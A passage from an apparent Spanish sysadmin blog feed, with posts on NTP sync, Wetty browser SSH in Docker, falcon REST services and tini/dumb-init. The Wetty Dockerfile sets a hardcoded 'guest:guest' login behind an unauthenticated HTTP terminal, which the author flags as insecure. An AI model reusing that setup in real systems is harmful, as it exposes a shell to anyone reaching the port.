&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/ntp.conf &lt;span class="p"&gt;|&lt;/span&gt; egrep &lt;span class="s2"&gt;&amp;quot;pool.*debian|server 10&amp;quot;&lt;/span&gt;
server &lt;span class="m"&gt;10&lt;/span&gt;.0.0.1
&lt;span class="c1"&gt;# pool 0.debian.pool.ntp.org iburst&lt;/span&gt;
&lt;span class="c1"&gt;# pool 1.debian.pool.ntp.org iburst&lt;/span&gt;
&lt;span class="c1"&gt;# pool 2.debian.pool.ntp.org iburst&lt;/span&gt;
&lt;span class="c1"&gt;# pool 3.debian.pool.ntp.org iburst&lt;/span&gt;
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como no, reiniciamos el servicio para que use la nueva configuración:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# systemctl restart ntp
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo queda observar que estamos sincronizando contra el servidor solicitado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ntpq -p
     remote           refid      st t when poll reach   delay   offset  &lt;span class="nv"&gt;jitter&lt;/span&gt;
&lt;span class="o"&gt;==============================================================================&lt;/span&gt;
 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.1            &lt;span class="m"&gt;10&lt;/span&gt;.0.0.1    &lt;span class="m"&gt;4&lt;/span&gt; u   &lt;span class="m"&gt;28&lt;/span&gt;   &lt;span class="m"&gt;64&lt;/span&gt;    &lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;.277  -12.387   &lt;span class="m"&gt;9&lt;/span&gt;.552
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Servidor NTP&lt;/h2&gt;
&lt;p&gt;Para configurar un servidor &lt;strong&gt;NTP&lt;/strong&gt; no se necesita nada adicional. El paquete que acabamos de instalar ya ha levantado un servidor &lt;strong&gt;NTP&lt;/strong&gt; preparado para que lo usen otros servidores que lleguen a él vía red. De hecho, en el ejemplo estamos sincronizando contra otro servidor (10.0.0.1) que es idéntico al del ejemplo, solo que está sincronizando de otro servidor. A nivel de seguridad, hay que tener en cuenta que el protocolo &lt;strong&gt;NTP&lt;/strong&gt; utiliza los puertos 123 TCP y UDP y solo se necesita permitir uno de estos dos a nivel de &lt;em&gt;firewall&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El estrato 4 (en el ejemplo) significa que estamos sincronizando contra un servidor de estrato 4, que es uno que sincroniza de uno de estrato 3. Al final de la cadena, encontraremos un reloj GPS o atómico, que es un servidor de estrato 1. El protocolo &lt;strong&gt;NTP&lt;/strong&gt; permite tener estratos hasta 15, significando el número 16 que no habría ninguna conectividad con el servidor especificado.&lt;/p&gt;</content><category term="ntp"></category><category term="servidor"></category><category term="hora"></category></entry><entry><title>Un terminal SSH en nuestro navegador web usando Wetty</title><link href="http://www.linuxsysadmin.ml/2017/09/un-terminal-ssh-en-nuestro-navegador-web-usando-wetty.html" rel="alternate"></link><published>2017-09-25T10:00:00+02:00</published><updated>2017-09-25T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-09-25:/2017/09/un-terminal-ssh-en-nuestro-navegador-web-usando-wetty.html</id><summary type="html">&lt;p&gt;No siempre tenemos acceso a nuestro terminal SSH favorito para acceder a nuestros entornos en caso de emergencia. De hecho, en muchas redes suelen prohibir el tráfico por otros puertos ajenos a la navegación web. Para estos casos podemos tener un terminal SSH a través de una página web propia …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No siempre tenemos acceso a nuestro terminal SSH favorito para acceder a nuestros entornos en caso de emergencia. De hecho, en muchas redes suelen prohibir el tráfico por otros puertos ajenos a la navegación web. Para estos casos podemos tener un terminal SSH a través de una página web propia.&lt;/p&gt;
&lt;p&gt;El truco consiste en usar &lt;strong&gt;Wetty&lt;/strong&gt;. Si os interesa, podéis encontrar el repositorio de GitHub &lt;a href="https://github.com/krishnasrinivas/wetty"&gt;aquí&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Terminal over HTTP and HTTPS. Wetty is an alternative to ajaxterm/anyterm but much better than them because wetty uses ChromeOS' terminal emulator (hterm) which is a full fledged implementation of terminal emulation written entirely in Javascript. Also it uses websockets instead of Ajax and hence better response time.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Podemos encontrar una imagen en &lt;a href="https://hub.docker.com/r/nathanleclaire/wetty/"&gt;DockerHub&lt;/a&gt;, que nos vale para una demostración rápida. Sin embargo, el gran tamaño de su imagen la hace impracticable para un uso habitual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/wetty$ docker images &lt;span class="p"&gt;|&lt;/span&gt; grep wetty
nathanleclaire/wetty   latest              94635175ccb6        &lt;span class="m"&gt;2&lt;/span&gt; years ago         &lt;span class="m"&gt;1&lt;/span&gt;.2 GB
gerard@aldebaran:~/docker/wetty$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así pues, podemos construir otra imagen, basándonos en los pasos de instalación que aparecían en GitHub, con el único añadido de un fichero &lt;em&gt;.tar.gz&lt;/em&gt; con una imagen del repositorio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/wetty$ tar tf wetty.tar.gz 
.gitignore
Dockerfile
Gruntfile.js
LICENSE
README.md
app.js
bin/
bin/wetty.conf
bin/wetty.js
bin/wetty.service
package.json
public/
public/index.html
public/wetty/
public/wetty/hterm_all.js
public/wetty/index.html
public/wetty/wetty.js
terminal.png
gerard@aldebaran:~/docker/wetty$ cat Dockerfile 
FROM alpine:3.5
RUN apk add --no-cache nodejs tini
ENV &lt;span class="nv"&gt;NODE_ENV&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;production
ADD wetty.tar.gz /srv/app/
WORKDIR /srv/app/
RUN apk add --no-cache python2 make g++ &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    npm install &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apk del python2 make g++
RUN adduser guest -D &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;guest:guest&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/sbin/tini&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;node&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;app.js&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-p&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;3000&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/wetty$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto nos deja una imagen mucho más pequeña, pero nos limita a entrar por SSH en un terminal de &lt;em&gt;Alpine Linux&lt;/em&gt;, que aunque magnífico, no es tan completo como el de otras distribuciones. Usad la distribución que más os convenga.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/wetty$ docker images &lt;span class="p"&gt;|&lt;/span&gt; grep wetty
wetty                  latest              45635173077e        &lt;span class="m"&gt;35&lt;/span&gt; minutes ago      &lt;span class="m"&gt;56&lt;/span&gt;.2 MB
gerard@aldebaran:~/docker/wetty$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como pretendo utilizarla como un máquina de salto, este tamaño y limitación son más que adecuados. Sin embargo no estaba dispuesto a pagar 1,2 gb por un contenedor que no hace nada por sí mismo...&lt;/p&gt;
&lt;p&gt;Solo nos queda ejecutar la imagen exponiendo el puerto 3000 del contenedor, para poder acceder remotamente desde el navegador, que en mi caso estaría en &lt;a href="http://localhost:3000/"&gt;http://localhost:3000/&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/wetty$ docker run -ti --rm -p &lt;span class="m"&gt;3000&lt;/span&gt;:3000 wetty
http on port &lt;span class="m"&gt;3000&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: Esta página está desprotegida, sin autenticación ni encriptación. Una buena opción está en dotarla de ambos usando un servidor web &lt;strong&gt;nginx&lt;/strong&gt; como frontal. También es interesante modificar el usuario de entrada con par de claves, añadir un cliente de SSH para saltar, y lo que más nos interese.&lt;/p&gt;</content><category term="ssh"></category><category term="terminal"></category><category term="wetty"></category></entry><entry><title>Escribiendo servicios web con python y falcon</title><link href="http://www.linuxsysadmin.ml/2017/09/escribiendo-servicios-web-con-python-y-falcon.html" rel="alternate"></link><published>2017-09-19T17:00:00+02:00</published><updated>2017-09-19T17:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-09-19:/2017/09/escribiendo-servicios-web-con-python-y-falcon.html</id><summary type="html">&lt;p&gt;El otro día me vi leyendo artículos sobre arquitecturas basadas en servicios web, especialmente centrados en patrones REST y codificados en JSON. No es la primera vez que hago algo con &lt;em&gt;frameworks&lt;/em&gt; no específicos, pero tras buscar un poco por internet, descubrí un &lt;em&gt;framework&lt;/em&gt; específico para servicios REST llamado &lt;strong&gt;falcon …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día me vi leyendo artículos sobre arquitecturas basadas en servicios web, especialmente centrados en patrones REST y codificados en JSON. No es la primera vez que hago algo con &lt;em&gt;frameworks&lt;/em&gt; no específicos, pero tras buscar un poco por internet, descubrí un &lt;em&gt;framework&lt;/em&gt; específico para servicios REST llamado &lt;strong&gt;falcon&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Se trata de u &lt;em&gt;microframework&lt;/em&gt; de diseño simplista, ligero, rápido y sin ninguna magia. Eso nos lleva al punto que me enamoró: no toma ninguna decisión y no obliga a usar ninguna capa de persistencia ni ningún motor de plantillas o serializado.&lt;/p&gt;
&lt;p&gt;Desde el punto de vista de rendimiento, está pensado para volar; no incluye nada que no sea específico de servicios web y sabe sacar provecho del &lt;em&gt;hardware&lt;/em&gt; moderno, permitiendo miles de peticiones por segundo en un &lt;em&gt;hardware&lt;/em&gt; modesto.&lt;/p&gt;
&lt;h2&gt;Una aplicación básica&lt;/h2&gt;
&lt;p&gt;De forma similar a otros &lt;em&gt;frameworks&lt;/em&gt; &lt;strong&gt;python&lt;/strong&gt;, nuestra API es una instancia de un objeto que se dedica a despachar rutas a controladores (aunque aquí los llaman &lt;em&gt;resources&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;A diferencia de otros &lt;em&gt;frameworks&lt;/em&gt;, sin embargo, el registro de &lt;em&gt;resources&lt;/em&gt; a rutas es explícita, invocando el método &lt;code&gt;add_route&lt;/code&gt; en el objeto API, que es la aplicación que debemos servir.&lt;/p&gt;
&lt;p&gt;Los &lt;em&gt;resources&lt;/em&gt; registrados en las rutas son simplemente objetos que definen los métodos &lt;code&gt;on_get&lt;/code&gt;, &lt;code&gt;on_post&lt;/code&gt; y hermanos, que se van a invocar dependiendo de verbo HTTP que nos sea solicitado, con un objeto tipo &lt;em&gt;request&lt;/em&gt; y uno tipo &lt;em&gt;response&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Veamos un ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/webservice$ cat requirements.txt 
&lt;span class="nv"&gt;falcon&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.2.0
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/webservice$ cat app.py 
import falcon
import json


class HelloResource&lt;span class="o"&gt;(&lt;/span&gt;object&lt;span class="o"&gt;)&lt;/span&gt;:
    def on_get&lt;span class="o"&gt;(&lt;/span&gt;self, req, res&lt;span class="o"&gt;)&lt;/span&gt;:
        res.body &lt;span class="o"&gt;=&lt;/span&gt; json.dumps&lt;span class="o"&gt;(&lt;/span&gt;
            &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;Hello world&amp;#39;&lt;/span&gt;,
            &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="nv"&gt;api&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; falcon.API&lt;span class="o"&gt;()&lt;/span&gt;
api.add_route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;, HelloResource&lt;span class="o"&gt;())&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/webservice$ cat server.py 
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

from wsgiref.simple_server import make_server
from app import api

&lt;span class="nv"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;8000&lt;/span&gt;
&lt;span class="nv"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; make_server&lt;span class="o"&gt;(&lt;/span&gt;host, port, api&lt;span class="o"&gt;)&lt;/span&gt;
try:
    print &lt;span class="s1"&gt;&amp;#39;Serving on %s:%s...&amp;#39;&lt;/span&gt; % &lt;span class="o"&gt;(&lt;/span&gt;host, port&lt;span class="o"&gt;)&lt;/span&gt;
    server.serve_forever&lt;span class="o"&gt;()&lt;/span&gt;
except KeyboardInterrupt:
    print &lt;span class="s1"&gt;&amp;#39;\nBye!&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/webservice$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ejecutamos el servidor de pruebas arriba expuesto para que sirva nuestra API simple:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/webservice$ ./server.py 
Serving on &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:8000...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo nos falta hacer alguna petición para ver como funciona:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl -i http://localhost:8000/
HTTP/1.0 &lt;span class="m"&gt;200&lt;/span&gt; OK
...  
content-type: application/json&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;UTF-8

&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Hello world&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~$ curl -siX POST http://localhost:8000/ &lt;span class="p"&gt;|&lt;/span&gt; head -1
HTTP/1.0 &lt;span class="m"&gt;405&lt;/span&gt; Method Not Allowed
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos una API simple. Lo normal es que los datos salgan de algún tipo de base de datos, pero &lt;strong&gt;falcon&lt;/strong&gt; no ofrece soporte para ninguna, con lo que deberíamos usar lo que más nos convenga, por ejemplo &lt;strong&gt;mongodb&lt;/strong&gt; con &lt;strong&gt;mongoengine&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;En caso de querer extraer parámetros de la url, podemos registrar la ruta con una URL de la forma &lt;code&gt;/hello/{name}&lt;/code&gt;. De esta forma, nuestra función recibiría un parámetro &lt;code&gt;name&lt;/code&gt; con el contenido de ese segmento de URL, además de los objetos &lt;em&gt;request&lt;/em&gt; y &lt;em&gt;response&lt;/em&gt;. Un  ejemplo a continuación:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/webservice$ cat app.py 
import falcon
import json


class HelloResource&lt;span class="o"&gt;(&lt;/span&gt;object&lt;span class="o"&gt;)&lt;/span&gt;:
    def on_get&lt;span class="o"&gt;(&lt;/span&gt;self, req, res, name&lt;span class="o"&gt;)&lt;/span&gt;:
        res.body &lt;span class="o"&gt;=&lt;/span&gt; json.dumps&lt;span class="o"&gt;(&lt;/span&gt;
            &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;Hello %s&amp;#39;&lt;/span&gt; % name,
            &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="nv"&gt;api&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; falcon.API&lt;span class="o"&gt;()&lt;/span&gt;
api.add_route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/hello/{name}&amp;#39;&lt;/span&gt;, HelloResource&lt;span class="o"&gt;())&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/webservice$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Hooks&lt;/h2&gt;
&lt;p&gt;Otra funcionalidad muy interesante son los &lt;em&gt;hooks&lt;/em&gt;, que son métodos con la forma &lt;code&gt;func(req, resp, resource, params)&lt;/code&gt; que se llaman antes o después de atender la función del &lt;em&gt;resource&lt;/em&gt; y nos permiten hacer varias cosas; desde añadir código hasta condicionar un método concreto.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: Los &lt;em&gt;hooks&lt;/em&gt; registrados con &lt;code&gt;falcon.after&lt;/code&gt; no disponen del parámetro &lt;code&gt;params&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Veamos un ejemplo, para evitar el código de serialización en cada método:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/webservice$ cat app.py 
import falcon
import json


def serialize&lt;span class="o"&gt;(&lt;/span&gt;req, res, resource&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="k"&gt;if&lt;/span&gt; req.client_accepts_json:
        res.body &lt;span class="o"&gt;=&lt;/span&gt; json.dumps&lt;span class="o"&gt;(&lt;/span&gt;res.body&lt;span class="o"&gt;)&lt;/span&gt;


class HelloResource&lt;span class="o"&gt;(&lt;/span&gt;object&lt;span class="o"&gt;)&lt;/span&gt;:
    @falcon.after&lt;span class="o"&gt;(&lt;/span&gt;serialize&lt;span class="o"&gt;)&lt;/span&gt;
    def on_get&lt;span class="o"&gt;(&lt;/span&gt;self, req, res, name&lt;span class="o"&gt;)&lt;/span&gt;:
        res.body &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;Hello %s&amp;#39;&lt;/span&gt; % name,
        &lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="nv"&gt;api&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; falcon.API&lt;span class="o"&gt;()&lt;/span&gt;
api.add_route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/hello/{name}&amp;#39;&lt;/span&gt;, HelloResource&lt;span class="o"&gt;())&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/webservice$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda decir que estos &lt;em&gt;hooks&lt;/em&gt; se pueden registrar a nivel de método o de &lt;em&gt;resource&lt;/em&gt; (aplicaría a todos los métodos del &lt;em&gt;resource&lt;/em&gt;). En caso de querer que aplique a toda la aplicación habría que escribir un &lt;em&gt;middleware&lt;/em&gt; apropiado.&lt;/p&gt;</content><category term="falcon"></category><category term="REST"></category><category term="microframework"></category><category term="framework"></category><category term="python"></category></entry><entry><title>Un proceso inicial para docker: tini y dumb-init</title><link href="http://www.linuxsysadmin.ml/2017/09/un-proceso-inicial-para-docker-tini-y-dumb-init.html" rel="alternate"></link><published>2017-09-11T10:00:00+02:00</published><updated>2017-09-11T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-09-11:/2017/09/un-proceso-inicial-para-docker-tini-y-dumb-init.html</id><summary type="html">&lt;p&gt;Siempre nos han vendido que &lt;strong&gt;docker&lt;/strong&gt; ejecuta un solo proceso, y que este puede ser cualquiera. Sin embargo, este proceso se ejecuta con PID 1, que es un poco especial y que tiene unas responsabilidades adicionales. Si no queremos implementarlas, podemos usar alguna solución que ya lo haga para nosotros …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Siempre nos han vendido que &lt;strong&gt;docker&lt;/strong&gt; ejecuta un solo proceso, y que este puede ser cualquiera. Sin embargo, este proceso se ejecuta con PID 1, que es un poco especial y que tiene unas responsabilidades adicionales. Si no queremos implementarlas, podemos usar alguna solución que ya lo haga para nosotros.&lt;/p&gt;
&lt;p&gt;Entre estas responsabilidades, podemos citar 3 que se consideran básicas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tiene que adoptar y controlar todos aquellos procesos que quedan huérfanos debido a una mala gestión de su anterior padre&lt;/li&gt;
&lt;li&gt;No puede dejar que ningún proceso &lt;em&gt;zombie&lt;/em&gt; quede sin su correspondiente &lt;em&gt;wait&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Debe ser capaz de progresar las señales de terminación a sus procesos hijos&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Muchos de los binarios que utilizamos habitualmente no incumplen estas responsabilidades, sea por una buena gestión, o porque directamente no levantan procesos hijos.&lt;/p&gt;
&lt;p&gt;El problema es cuando alguno de estos procesos sí que incumple. En estos casos &lt;strong&gt;docker&lt;/strong&gt; puede enviar señales de acabado, y viendo que no todos los procesos han acabado, tiene que entrar tras 10 segundos a arreglar el desaguisado. Aunque &lt;strong&gt;docker&lt;/strong&gt; hace un trabajo magnífico en este aspecto, el resultado es un contenedor que es caro de apagar, en cuanto a tiempo se refiere.&lt;/p&gt;
&lt;p&gt;Y es por eso que han habido varios intentos de crear un proceso &lt;strong&gt;init&lt;/strong&gt; que pueda levantar otro proceso único, pero cumpliendo con las responsabilidades que se le presuponen. Entre estos binarios, me gustaría mencionar dos: &lt;strong&gt;tini&lt;/strong&gt; y &lt;strong&gt;dumb-init&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;El problema&lt;/h2&gt;
&lt;p&gt;Vamos a hacer este ejemplo con un servicio afectado por el problema, para su fácil demostración. No se trata de un servicio raro o de uso minoritario, sino que estamos hablando de &lt;strong&gt;haproxy&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a partir del más simple de los balanceadores basados en &lt;strong&gt;haproxy&lt;/strong&gt; y &lt;strong&gt;alpine linux&lt;/strong&gt;, con una configuración mínima (por no decir nula).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~/docker/docker-init$ cat context/Dockerfile
FROM alpine:3.6
RUN apk add --no-cache haproxy
COPY haproxy.cfg /etc/haproxy/
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;haproxy&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-f&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/etc/haproxy/haproxy.cfg&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-db&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@docker:~/docker/docker-init$ cat context/haproxy.cfg
global
    chroot /var/lib/haproxy
    user haproxy
    group haproxy

defaults
    mode http

listen stats
    &lt;span class="nb"&gt;bind&lt;/span&gt; *:8080
    stats &lt;span class="nb"&gt;enable&lt;/span&gt;
    stats uri /

&lt;span class="c1"&gt;#listen web&lt;/span&gt;
&lt;span class="c1"&gt;#    bind *:80&lt;/span&gt;
&lt;span class="c1"&gt;#    balance roundrobin&lt;/span&gt;
&lt;span class="c1"&gt;#    server web1 web1:80 check&lt;/span&gt;
&lt;span class="c1"&gt;#    server web2 web2:80 check&lt;/span&gt;
gerard@docker:~/docker/docker-init$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La vamos a construir siguiendo los comandos habituales:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~/docker/docker-init$ docker build -t balancer context/
Sending build context to Docker daemon &lt;span class="m"&gt;3&lt;/span&gt;.072 kB
...
Successfully built 499dc4873adb
gerard@docker:~/docker/docker-init$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo que vamos a ver es que la imagen no se detiene en un tiempo adecuado. Para ellos vamos a automatizar su levantamiento y su parada con &lt;strong&gt;docker-compose&lt;/strong&gt; y vamos a cronometrar lo segundo. Os adjunto el fichero &lt;em&gt;docker-compose.yml&lt;/em&gt;, aunque es relativamente simple.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~/docker/docker-init$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  balancer:
    image: balancer
    container_name: balancer
    hostname: balancer
gerard@docker:~/docker/docker-init$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;dockerinit_default&amp;quot;&lt;/span&gt; with the default driver
Creating balancer
gerard@docker:~/docker/docker-init$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y podemos ver que este contenedor tan simple no acaba decentemente, teniendo que esperar 10 segundos para que &lt;strong&gt;docker&lt;/strong&gt; elimine el resto, cosa que es molesta y puede llevar a problemas futuros.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~/docker/docker-init$ &lt;span class="nb"&gt;time&lt;/span&gt; docker-compose down
Stopping balancer ... &lt;span class="k"&gt;done&lt;/span&gt;
Removing balancer ... &lt;span class="k"&gt;done&lt;/span&gt;
Removing network dockerinit_default

real    0m10,486s
user    0m0,348s
sys     0m0,028s
gerard@docker:~/docker/docker-init$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;La solución&lt;/h2&gt;
&lt;p&gt;Ambas soluciones propuestas (&lt;strong&gt;tini&lt;/strong&gt; y &lt;strong&gt;dumb-init&lt;/strong&gt;) funcionan de la misma forma: ejecutan el comando que se les pasa en los argumentos. De esta forma, el comando "peligroso" se ejecuta con PID diferente de 1, siendo el PID 1 el mismo &lt;em&gt;init&lt;/em&gt;. Podemos anteponer el &lt;em&gt;init&lt;/em&gt; sin muchas modificaciones; basta con instalar el &lt;em&gt;init&lt;/em&gt; y usar la directiva &lt;code&gt;ENTRYPOINT&lt;/code&gt; para anteponer el nuevo &lt;em&gt;init&lt;/em&gt;. Veamos ambos como ejemplo.&lt;/p&gt;
&lt;h3&gt;Usando tini&lt;/h3&gt;
&lt;p&gt;Podemos instalar el paquete &lt;strong&gt;tini&lt;/strong&gt; sin añadir una nueva línea en el &lt;em&gt;Dockerfile&lt;/em&gt;, aprovechando el &lt;code&gt;apk add&lt;/code&gt; del mismo &lt;strong&gt;haproxy&lt;/strong&gt;. Prefijamos nuestro &lt;code&gt;CMD&lt;/code&gt; con el binario &lt;strong&gt;tini&lt;/strong&gt; mediante el uso de &lt;code&gt;ENTRYPOINT&lt;/code&gt; y listo.&lt;/p&gt;
